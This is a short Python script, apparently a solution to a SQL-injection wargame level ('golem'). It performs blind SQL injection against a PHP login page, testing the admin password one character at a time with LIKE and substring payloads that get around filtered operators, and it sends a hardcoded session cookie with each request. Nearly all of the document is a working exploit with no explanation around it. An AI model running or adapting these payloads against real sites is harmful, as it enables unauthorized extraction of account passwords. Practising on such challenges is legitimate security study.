import urllib.request
length=8
pw=""
arr="1234567890qwertyuioplkjhgfdsazxcvbnmMNBVCXZASDFGHJKLPOIUYTREWQ"
for i in range(1,9):
	for j in range(0,62):
		url="http://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php?pw='%20||%20id%20LIKE%20'admin'%20%26%26%20substring(pw,{0},1)%20LIKE%20'{ascii}'%20%23".format(i,ascii=arr[j])
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
		print(url)
		data = urllib.request.urlopen(r).read().decode("utf-8")
		if data.find('Hello admin') != -1 :
			pw = pw + arr[j]
			print(arr[j])
			break
print(pw)